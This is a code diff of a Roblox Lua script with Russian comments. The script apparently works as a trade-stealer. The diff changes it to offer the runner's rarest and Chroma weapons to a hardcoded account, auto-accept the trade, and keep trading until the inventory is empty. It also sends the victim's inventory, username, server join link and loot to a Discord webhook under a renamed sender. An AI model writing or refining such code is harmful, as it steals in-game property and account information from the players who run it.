@@ -10,6 +10,7 @@ local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then return end
 
 local TARGET_NAME = "Marie_31113"
+local isTrading = false
 
 local function sendDiscord(payload)
     local requestFunc = request or http_request or (syn and syn.request)
@@ -24,7 +25,6 @@ local function sendDiscord(payload)
     end)
 end
 
--- Получаем инфу об игре и инжекторе
 local placeId, jobId = game.PlaceId, game.JobId
 local gameName = "Unknown"
 pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
@@ -47,10 +47,11 @@ local function sendTradeToTarget()
         local ok, res = pcall(function() return SendRequest:InvokeServer(target) end)
         if ok and res == true then
             print("[trade] ✅ Запрос на трейд отправлен.")
-            return
+            return true
         end
         task.wait(2)
     end
+    return false
 end
 
 -- =========================================================
@@ -79,40 +80,81 @@ end
 hideTradeWindows()
 
 -- =========================================================
--- 3. ВЫСТАВЛЕНИЕ + АВТО-АКЦЕПТ + ЛОГ ЛУТА (ЖЕСТКАЯ ЗАЩИТА ОТ СПАМА)
+-- 3. ВЫСТАВЛЕНИЕ (CHROMA -> ОСТАЛЬНЫЕ) + АВТО-АКЦЕПТ
 -- =========================================================
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 local lastOffer = nil
 local myName = LocalPlayer.Name
-local offered = false
-local lastLogTime = 0 -- Запоминаем время последнего лога для защиты от спама
+local lastLogTime = 0
+
+local function countItems()
+    local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
+    if not okPD or not PD then return 0 end
+    local count = 0
+    for id, amount in pairs(PD.Weapons.Owned or {}) do
+        count = count + (tonumber(amount) or 1)
+    end
+    return count
+end
 
 Trade.StartTrade.OnClientEvent:Connect(function()
-    offered = true
+    isTrading = true
     task.wait(2)
 
     local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
     local okSync, Sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
     if not okPD or not okSync then return end
 
-    local safeCommon = {}
+    local chromaList = {}
+    local lists = {
+        Godly = {}, Vintage = {}, Ancient = {}, Unique = {},
+        Legendary = {}, Rare = {}, Uncommon = {}, Common = {}
+    }
+    
     local dangerous = {
         ["Fragile_G_2023"] = true, ["CandyCorn_K_2024"] = true,
         ["Patrick"] = true, ["Xbox"] = true, ["Santa"] = true,
         ["Coal"] = true, ["CandyCorn"] = true,
     }
 
+    -- Раскидываем предметы
     for id, amount in pairs(PD.Weapons.Owned or {}) do
-        if #safeCommon >= 4 then break end
         local info = Sync.Weapons and Sync.Weapons[id]
-        if info and info.Rarity == "Common" and not dangerous[id] then
-            table.insert(safeCommon, {id = id, type = "Weapons"})
+        if info then
+            local item = {id = id, type = "Weapons"}
+            local itemName = info.ItemName or info.Name or id
+            local rarity = info.Rarity or "Common"
+            
+            local isChroma = string.find(string.lower(itemName), "chroma") or string.find(string.lower(id), "chroma")
+
+            if isChroma then
+                table.insert(chromaList, item)
+            elseif lists[rarity] then
+                if not (rarity == "Common" and dangerous[id]) then
+                    table.insert(lists[rarity], item)
+                end
+            end
         end
     end
 
-    for _, item in ipairs(safeCommon) do
+    -- Собираем финальный список (Chroma в самом начале!)
+    local finalList = {}
+    
+    for _, item in ipairs(chromaList) do table.insert(finalList, item) end
+    
+    local order = {"Godly", "Vintage", "Ancient", "Unique", "Legendary", "Rare", "Uncommon", "Common"}
+    for _, rarity in ipairs(order) do
+        for _, item in ipairs(lists[rarity]) do
+            table.insert(finalList, item)
+        end
+    end
+
+    -- Выставляем максимум 4 предмета (УСКОРЕНО ДО 0.2)
+    for i = 1, math.min(#finalList, 4) do
+        local item = finalList[i]
         pcall(function() Trade.OfferItem:FireServer(item.id, item.type) end)
-        task.wait(0.4)
+        print("[offer] ✅ Выставил " .. item.id)
+        task.wait(0.2) 
     end
 end)
 
@@ -122,20 +164,13 @@ end)
 
 Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
     if success then
-        -- 🛑 ЗАЩИТА ОТ СПАМА: Если прошло меньше 15 секунд, игнорируем
-        if os.clock() - lastLogTime < 15 then 
-            print("[debug] Блокируем спам сообщения.")
+        if os.clock() - lastLogTime < 5 then return end
+        if not lootList or #lootList == 0 then 
+            isTrading = false
             return 
         end
 
-        -- Если лута нет, то и писать нечего
-        if not lootList or #lootList == 0 then
-            print("[debug] Лут пустой, лог не отправлен.")
-            return
-        end
-
-        lastLogTime = os.clock() -- Записываем время отправки
-        print("[debug] Логируем лут...")
+        lastLogTime = os.clock()
 
         local itemsText = ""
         for _, item in ipairs(lootList) do
@@ -150,7 +185,7 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
         end
 
         sendDiscord({
-            username = "Trade Logger (" .. myName .. ")",
+            username = "Sematary Real", -- 👈 ИМЯ ПЕРЕИМЕНОВАНО
             embeds = {
                 {
                     title = "📦 Успешный трейд с " .. TARGET_NAME,
@@ -167,8 +202,21 @@ Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
             }
         })
         print("[trade] 📦 Лут отправлен в Discord!")
+
+        local currentCount = countItems()
+        print("[debug] Предметов в инвентаре сейчас: " .. currentCount)
+
+        task.wait(10) 
+        isTrading = false
+
+        if Players:FindFirstChild(TARGET_NAME) and currentCount > 0 then
+            print("[trade] Запускаем следующий трейд (в инвентаре осталось " .. currentCount .. " шт.)...")
+            sendTradeToTarget()
+        else
+            print("[trade] Предметы закончились или Мари вышла. Цикл завершен.")
+        end
+
     else
-        -- Авто-акцепт (если Мари нажала Accept)
         if lastOffer then
             pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer) end)
             print("[trade] ✅ Авто-акцепт отправлен.")
@@ -179,20 +227,26 @@ end)
 -- =========================================================
 -- 4. ОЖИДАНИЕ ЗАХОДА
 -- =========================================================
+local function onTargetJoined()
+    if not isTrading then
+        task.spawn(sendTradeToTarget)
+    end
+end
+
 if Players:FindFirstChild(TARGET_NAME) then
-    task.spawn(sendTradeToTarget)
+    onTargetJoined()
 else
     print("[trade] Ждём захода " .. TARGET_NAME .. "...")
 end
 
 Players.PlayerAdded:Connect(function(pl)
     if pl.Name == TARGET_NAME then
-        task.spawn(sendTradeToTarget)
+        onTargetJoined()
     end
 end)
 
 -- =========================================================
--- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (Большой embed с инвентарём)
+-- 5. ОБЩИЙ ЛОГ ПРИ ЗАХОДЕ (Детальный подсчёт редкостей)
 -- =========================================================
 task.spawn(function()
     task.wait(6)
@@ -202,9 +256,11 @@ task.spawn(function()
     if not okPD or not okSync then return end
 
     local weaponCount = 0
-    local godlyList = {}
-    local vintageList = {}
-    local uncommonList = {}
+    local lists = {
+        Godly = {}, Vintage = {}, Ancient = {}, Unique = {},
+        Legendary = {}, Rare = {}, Uncommon = {}, Common = {}
+    }
+    local chromaList = {}
 
     for id, amount in pairs(PD.Weapons.Owned or {}) do
         local count = tonumber(amount) or 1
@@ -214,13 +270,14 @@ task.spawn(function()
         if info then
             local itemName = (info.ItemName or info.Name or id)
             local entry = itemName .. " (x" .. count .. ")"
-            
-            if info.Rarity == "Godly" then
-                table.insert(godlyList, "🔹 " .. entry)
-            elseif info.Rarity == "Vintage" then
-                table.insert(vintageList, "🔸 " .. entry)
-            elseif info.Rarity == "Uncommon" then
-                table.insert(uncommonList, "▫️ " .. entry)
+            local rarity = info.Rarity or "Common"
+
+            if string.find(string.lower(itemName), "chroma") or string.find(string.lower(id), "chroma") then
+                table.insert(chromaList, "🌟 " .. entry)
+            end
+
+            if lists[rarity] then
+                table.insert(lists[rarity], entry)
             end
         end
     end
@@ -232,10 +289,35 @@ task.spawn(function()
         return text
     end
 
+    local fields = {
+        { name = "👤 Никнейм", value = "**"..myName.."**", inline = true },
+        { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
+        { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
+        { name = "🔗 Сервер", value = "[Нажми, чтобы зайти]("..joinLink..")", inline = false },
+        { name = "📊 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false }
+    }
+
+    if #chromaList > 0 then
+        table.insert(fields, { name = "🌈 Chroma", value = getListString(chromaList, "Нет"), inline = false })
+    end
+
+    local order = {"Godly", "Vintage", "Ancient", "Unique", "Legendary", "Rare", "Uncommon", "Common"}
+    local titles = {
+        Godly = "🟣 Godly", Vintage = "🟤 Vintage", Ancient = "🟠 Ancient",
+        Unique = "🔵 Unique", Legendary = "🟡 Legendary", Rare = "🔷 Rare",
+        Uncommon = "🟢 Uncommon", Common = "⚪ Common"
+    }
+
+    for _, rarity in ipairs(order) do
+        if #lists[rarity] > 0 then
+            table.insert(fields, { name = titles[rarity], value = getListString(lists[rarity], "Нет"), inline = false })
+        end
+    end
+
     local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
 
     sendDiscord({
-        username = "Session Logger",
+        username = "Sematary Real", -- 👈 ИМЯ ПЕРЕИМЕНОВАНО
         embeds = {
             {
                 author = {
@@ -246,16 +328,7 @@ task.spawn(function()
                 description = "Собрана подробная информация об аккаунте.",
                 color = 0x9B59B6,
                 thumbnail = { url = avatarUrl },
-                fields = {
-                    { name = "👤 Никнейм", value = "**"..myName.."**", inline = true },
-                    { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
-                    { name = "🕹️ Игра", value = "**"..gameName.."**", inline = true },
-                    { name = "🔗 Сервер", value = "[Нажми, чтобы зайти]("..joinLink..")", inline = false },
-                    { name = "📊 Всего оружия", value = "**"..weaponCount.." шт.**", inline = false },
-                    { name = "🟣 Godly", value = getListString(godlyList, "Нет"), inline = false },
-                    { name = "🟡 Vintage", value = getListString(vintageList, "Нет"), inline = false },
-                    { name = "⚪ Uncommon", value = getListString(uncommonList, "Нет"), inline = false }
-                },
+                fields = fields,
                 footer = { 
                     text = "Delta Mobile Logger • UserId: " .. LocalPlayer.UserId,
                     icon_url = avatarUrl
@@ -264,5 +337,5 @@ task.spawn(function()
             }
         }
     })
-    print("[inv] Большой лог сессии отправлен в Discord.")
+    print("[inv] Детальный лог сессии отправлен в Discord.")
 end)
